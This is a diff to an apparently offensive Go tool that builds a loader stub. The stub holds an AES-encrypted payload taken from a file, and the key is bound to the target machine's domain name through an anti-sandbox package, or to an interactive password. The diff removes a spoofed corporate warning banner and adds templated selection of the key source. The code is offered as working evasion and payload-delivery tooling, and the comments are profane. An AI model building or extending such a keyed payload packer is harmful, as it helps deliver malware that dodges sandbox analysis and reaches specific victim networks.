@@ -13,11 +13,10 @@ import (
 	"time"
 )
 
-
-
 type args struct {
 	Key        string
 	Ciphertext string
+	KeyFunc    string
 }
 
 func checkAndPanic(err error) {
@@ -38,14 +37,11 @@ func generateRandomBytes(n int) ([]byte, error) {
 	return b, nil
 }
 
-
 func encrypt(plaintext []byte, fullKey []byte) (string, string) {
 	key := make([]byte, 32)
 	var r_err error
 	var rand []byte
 	rem := 32 - len(fullKey)
-
-
 
 	if rem < 0 {
 		copy(key[0:24], []byte(fullKey)[0:24])
@@ -72,11 +68,20 @@ func encrypt(plaintext []byte, fullKey []byte) (string, string) {
 }
 
 func main() {
+	domain_prompt := `
+	sbx := AntiSandbox.NewSBX()
+	partialKey := sbx.DomainName
+`
+	password_prompt := `
+	passwd := make([]byte, 0)
+	passwd, _ = terminal.ReadPassword(int(syscall.Stdin))
+	partialKey := passwd	
+`
+
 	body := `
 package main
 
 import (
-	"golang.org/x/crypto/ssh/terminal"
 	"DomainKeyedEnc/pkg/AntiSandbox"
 	"crypto/aes"
 	"crypto/cipher"
@@ -107,35 +112,18 @@ func alloc(size uintptr) (uintptr, error) {
 }
 
 func main() {
-	hilton_preample := `+"`" + `
-*********************************************************************
-*********************************************************************
-
-			PROPERTY OF HILTON PROPERTIES INC
-
-			AUTHORIZED PERSONNEL ONLY
-
-			ANY UNAUTHORIZED USE WILL LEAD TO
-		IMMEDIATE PROSECUTION PURSUANT TO CA. 1.3.189a
-
-*********************************************************************
-*********************************************************************
-	` + "`" + `
 	ciphertext, _ := base64.StdEncoding.DecodeString("{{.Ciphertext}}")
-	sbx := AntiSandbox.NewSBX()
-	domainName := sbx.DomainName
-	key, _ := base64.StdEncoding.DecodeString("{{.Key}}")
-	print(hilton_preample)
-
-	passwd := make([]byte, 0)
-	passwd, _ = terminal.ReadPassword(int(syscall.Stdin))
 	
-	domainName = string(passwd)
+	key, _ := base64.StdEncoding.DecodeString("{{.Key}}")
+
 	composite_key := make([]byte, 32)
 
-	dnLen := len(domainName)
-	copy(composite_key[0:dnLen], []byte(domainName))
-	copy(composite_key[dnLen:], key)
+	{{.KeyFunc}}
+	
+	
+	partialKeyLen := len(partialKey)
+	copy(composite_key[0:partialKeyLen], []byte(partialKey))
+	copy(composite_key[partialKeyLen:], key)
 
 	key = composite_key
 
@@ -155,7 +143,6 @@ func main() {
 }
 `
 
-
 	file := flag.String("file", "", "file containing your payload")
 	domainKey := flag.String("domain", "", "domain/workgroup to key against (Default: None)")
 	passwd := flag.String("password", "", "add an INTERACTIVE password prompt to enter a password for decrypting the payload")
@@ -164,15 +151,18 @@ func main() {
 	fullKey := "My NaMe iS GoLAnG aND I fuCkInG BloW at VArIaBLE ScoPEEE"
 	_ = fullKey // HURR REMOVE ME AND THE WHOLE THING FUCKING BREAKS
 
-	if *passwd != "" && *domainKey != ""{
+	if *file == "" {
+		log.Fatal("Missing payload file")
+
+	}
+
+	if *passwd != "" && *domainKey != "" {
 		log.Fatal("Can't use domain keying and password at the same time as of this release")
-	} else if *passwd != ""{
+	} else if *passwd != "" {
 		fullKey = *passwd
 	} else {
 		fullKey = *domainKey
 	}
-
-
 
 	tmpl, err := template.New("body").Parse(body)
 	checkAndPanic(err)
@@ -181,8 +171,20 @@ func main() {
 	checkAndPanic(err)
 
 	ciphertext, key := encrypt(data, []byte(fullKey))
-	tmpl.Execute(os.Stdout, args{
-		Ciphertext: ciphertext,
-		Key:        key,
-	})
+
+	if *passwd != "" && *domainKey == "" {
+		tmpl.Execute(os.Stdout, args{
+			Ciphertext: ciphertext,
+			Key:        key,
+			KeyFunc:    password_prompt,
+		})
+	} else if *passwd == "" && *domainKey != ""{
+		tmpl.Execute(os.Stdout, args{
+			Ciphertext: ciphertext,
+			Key:        key,
+			KeyFunc:    domain_prompt,
+		})
+	} else {
+		print("Can't use both at the same time")
+	}
 }
